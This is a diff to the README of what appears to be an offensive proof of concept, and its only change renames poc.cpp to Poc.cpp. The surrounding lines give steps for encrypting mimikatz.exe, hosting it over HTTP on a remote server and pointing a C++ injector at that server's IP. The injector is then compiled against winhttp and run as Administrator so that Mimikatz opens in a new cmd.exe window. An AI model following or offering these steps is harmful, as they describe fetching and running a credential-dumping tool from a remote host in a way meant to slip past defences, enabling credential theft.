@@ -67,7 +67,7 @@ Ensure `mimikatz.exe.enc` is in the server root.
 
 ### 3️⃣ **Configure the Injector**
 
-Edit **`USER CONFIGURATION`** in `poc.cpp`:
+Edit **`USER CONFIGURATION`** in `Poc.cpp`:
 
 ```cpp
 // 1. Remote server IP address (e.g., "192.168.0.161")
@@ -97,12 +97,12 @@ Build → Build Solution
 
 **Command line (MinGW or MSVC):**
 ```bash
-cl /EHsc /Fe:poc.exe poc.cpp /link winhttp.lib
+cl /EHsc /Fe:Poc.exe Poc.cpp /link winhttp.lib
 ```
 
 **Run as Administrator:**
 ```bash
-poc.exe
+Poc.exe
 ```
 
 ---
@@ -278,8 +278,8 @@ mimikatz #
 
 1. **Encrypt** `mimikatz.exe` → `mimikatz.exe.enc` with `enc.py`.
 2. **Host** the encrypted file via HTTP.
-3. **Compile** `poc.cpp` as x64.
-4. **Run** `poc.exe` as Administrator.
+3. **Compile** `Poc.cpp` as x64.
+4. **Run** `Poc.exe` as Administrator.
 5. **Verify** – a new `cmd.exe` window appears with Mimikatz.
 
 ---
